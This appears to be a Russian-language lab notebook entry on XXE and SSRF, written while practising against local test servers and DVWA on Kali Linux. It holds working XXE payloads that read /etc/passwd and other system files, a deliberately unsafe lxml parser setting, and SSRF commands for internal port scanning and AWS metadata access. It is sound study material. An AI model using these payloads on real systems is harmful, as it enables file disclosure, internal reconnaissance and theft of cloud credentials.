# День 15 — XXE + SSRF
**Дата:** 2026-04-30  
**Платформа:** Kali Linux | Python HTTP серверы (порты 8888, 9999)

---

## Часть 1 — XXE (XML External Entity Injection)

### Что такое XML?
XML — формат передачи данных между приложениями:
```xml
<?xml version="1.0"?>
<user>
    <name>Muhammad</name>
    <role>admin</role>
</user>
```

### Что такое External Entity?
XML позволяет объявлять переменные (entity):
```xml
<!DOCTYPE foo [<!ENTITY myname "Muhammad">]>
<user><name>&myname;</name></user>
```
Сервер подставляет "Muhammad" вместо &myname; — это нормально.

### В чём уязвимость?
XML поддерживает загрузку данных из ВНЕШНИХ источников:
```xml
<!DOCTYPE foo [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
<user><name>&secret;</name></user>
```
Уязвимый сервер читает файл и возвращает содержимое в ответе!

---

## Практика XXE

### Уязвимый парсер (Python lxml):
```python
parser = etree.XMLParser(
    resolve_entities=True,  # разрешает entity
    no_network=False,       # разрешает внешние запросы
    load_dtd=True           # загружает DTD
)
```

### Команды атаки:
```bash
# Базовый тест
curl -s -X POST http://127.0.0.1:8888 \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><name>Muhammad</name></user>'
# Ответ: Hello, Muhammad!

# XXE — читаем /etc/passwd
curl -s -X POST http://127.0.0.1:8888 \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
<user><name>&secret;</name></user>'
# Ответ: root:x:0:0:root:/root:/usr/bin/bash ...

# XXE — читаем /etc/hosts
curl -s -X POST http://127.0.0.1:8888 \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY secret SYSTEM "file:///etc/hosts">]>
<user><name>&secret;</name></user>'
# Ответ: 127.0.0.1 localhost / 127.0.1.1 kali

# XXE — версия ядра
curl -s -X POST http://127.0.0.1:8888 \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY secret SYSTEM "file:///proc/version">]>
<user><name>&secret;</name></user>'
# Ответ: Linux version 6.19.11+kali-amd64 ...
```

### Что прочитали:
| Файл | Результат |
|------|-----------|
| `/etc/passwd` | ✅ все пользователи системы |
| `/etc/hosts` | ✅ внутренняя сеть: 127.0.1.1 = kali |
| `/proc/version` | ✅ Linux 6.19.11+kali, gcc-15, Debian |
| `config.inc.php` | ⚠️ PHP не выполняется через XXE |
| `/home/kali/.ssh/id_rsa` | ⚠️ SSH ключ не создан |

---

## Часть 2 — SSRF (Server-Side Request Forgery)

### Принцип:
```
XXE  → сервер читает ФАЙЛЫ за нас
SSRF → сервер делает HTTP ЗАПРОСЫ за нас

Атакующий → SSRF → Уязвимый сервер → Внутренняя сеть
```

Firewall видит запрос от сервера к серверу — разрешает.
Мы получаем данные внутренней сети которые нам недоступны напрямую!

### Команды атаки:
```bash
# SSRF — читаем DVWA login
curl -s "http://127.0.0.1:9999/?url=http://127.0.0.1/dvwa/login.php" | grep title
# <title>Login :: Damn Vulnerable Web Application (DVWA)</title>  ✅

# SSRF — читаем about.php
curl -s "http://127.0.0.1:9999/?url=http://127.0.0.1/dvwa/about.php" | grep -i "dvwa"

# SSRF — сканируем порты изнутри
curl -s "http://127.0.0.1:9999/?url=http://127.0.0.1:22"   # SSH
curl -s "http://127.0.0.1:9999/?url=http://127.0.0.1:3306" # MySQL

# SSRF — AWS metadata (в облаке даёт ключи!)
curl -s "http://127.0.0.1:9999/?url=http://169.254.169.254/latest/meta-data/"
```

### Интерпретация ответов:
| Ответ | Значение |
|-------|----------|
| HTML / данные | порт ОТКРЫТ ✅ |
| Connection refused | порт ЗАКРЫТ |
| Timeout | порт ФИЛЬТРУЕТСЯ |
| HTTP 500 | сервис работает, но ошибка |

### Цели SSRF в реальных атаках:
```
http://localhost/admin              → скрытая админка
http://169.254.169.254/latest/meta-data/ → AWS ключи!
http://127.0.0.1:6379              → Redis без пароля
http://127.0.0.1:27017             → MongoDB без пароля
http://192.168.1.1                 → роутер внутренней сети
```

---

## Инструменты дня
| Инструмент | Команда | Что делает |
|-----------|---------|------------|
| curl POST XML | `curl -X POST -H "Content-Type: application/xml" -d` | отправляет XML |
| XXE payload | `<!ENTITY x SYSTEM "file:///etc/passwd">` | читает файл |
| lxml уязвимый | `resolve_entities=True, load_dtd=True` | включает XXE |
| SSRF | `/?url=http://адрес` | проксирует запрос |
| file:// | `file:///путь` | локальные файлы |
| http:// | `http://169.254.169.254` | внутренние сервисы |
